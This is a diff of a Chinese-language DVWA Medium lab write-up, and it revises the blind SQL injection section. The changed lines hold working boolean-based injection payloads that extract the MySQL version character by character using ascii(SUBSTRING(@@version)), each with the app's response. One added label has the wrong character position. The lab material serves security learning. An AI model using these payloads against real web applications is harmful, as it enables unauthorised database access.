@@ -1,7 +1,7 @@
 # DVWA - Medium
 
 Created time: February 14, 2022 2:02 PM
-Last Edited: February 21, 2022 3:13 PM
+Last Edited: February 21, 2022 7:12 PM
 Property: February 14, 2022 2:02 PM
 Tags: DVWA, writeup
 
@@ -1045,6 +1045,8 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 Find the version of the SQL database software through a blind SQL attack.
 > 
 
+### 觀察
+
 這關也是改用 POST
 
 先透過上一關驗證一下 VERSION 語法
@@ -1119,8 +1121,6 @@ id=1 AND (SELECT SUBSTRING((SELECT @@version),1,2)) = 12 &Submit=Submit
 
 理論上應該是可以猜出 DB 的本版
 
-知道是因為 post dada 被視為字串後，就可以知道為什麼這邊可以寫 `10.` 而不會噴錯了
-
 ```sql
 id=1 AND (SELECT SUBSTRING((SELECT @@version),1,3)) = 10.);&Submit=Submit
 ```
@@ -1130,6 +1130,8 @@ id=1 AND (SELECT SUBSTRING((SELECT @@version),1,3)) = 10.);&Submit=Submit
 但如果再增加下去 10.x.x 的判斷會無效，崩潰
 
 換個環境再測 db 是 `5.7.34` ，也是第二個小數點之後無法正常判斷，頂多只能判斷到 5.7
+
+看提示說這關有使用 `mysql_real_escape_string()` ，會將 \x00, \n, \r, \, ', ", \x1a 跳脫
 
 ```sql
 id=1 AND (SELECT SUBSTRING((SELECT @@version),1,5)) = 10.10&Submit=Submit
@@ -1181,10 +1183,10 @@ SELECT SUBSTRING((SELECT @@version),1,6)
 # 5.7.34
 ```
 
-5
+判斷版本的第 1 個字元是否為 5
 
 ```sql
-SELECT 1=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53); &Submit=Submit
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53); &Submit=Submit
 # User ID is MISSING in the database
 ```
 
@@ -1195,45 +1197,45 @@ select SUBSTRING((SELECT @@version),2,1);
 # .
 ```
 
-.
+判斷版本的第 2 個字元是否為 .
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),2,1)) = 46); &Submit=Submit
 # User ID exists in the database
 ```
 
-7
+判斷版本的第 3 個字元是否為 7
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),3,1)) = 55); &Submit=Submit
 # User ID exists in the database
 ```
 
-.
+判斷版本的第 4 個字元是否為 .
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),4,1)) = 46); &Submit=Submit
 # User ID exists in the database
 ```
 
-3
+判斷版本的第 5 個字元是否為 3
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),5,1)) = 51); &Submit=Submit
 # User ID exists in the database
 ```
 
-.
+判斷版本的第 6 個字元是否為 .
 
 ```sql
 id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),6,1)) = 46); &Submit=Submit
 # User ID is MISSING in the database
 ```
 
-4
+判斷版本的第 6 個字元是否為 4
 
 ```sql
-id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),6,1)) = 52); &Submit=Submit
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),7,1)) = 52); &Submit=Submit
 # User ID exists in the database
 ```
 
@@ -1552,7 +1554,7 @@ token=XXsseccusXX&phrase=success&send=Submit
 
 # Ref
 
-DVWA 通关指南：SQL Injection-Blind(SQL 盲注) - 乌漆WhiteMoon - 博客园
+- DVWA 通关指南：SQL Injection-Blind(SQL 盲注) - 乌漆WhiteMoon - 博客园
 [https://www.cnblogs.com/linfangnan/p/13694057.html](https://www.cnblogs.com/linfangnan/p/13694057.html)
-SQL CAST and SQL CONVERT function overview
+- SQL CAST and SQL CONVERT function overview
 [https://www.sqlshack.com/overview-of-the-sql-cast-and-sql-convert-functions-in-sql-server/](https://www.sqlshack.com/overview-of-the-sql-cast-and-sql-convert-functions-in-sql-server/)
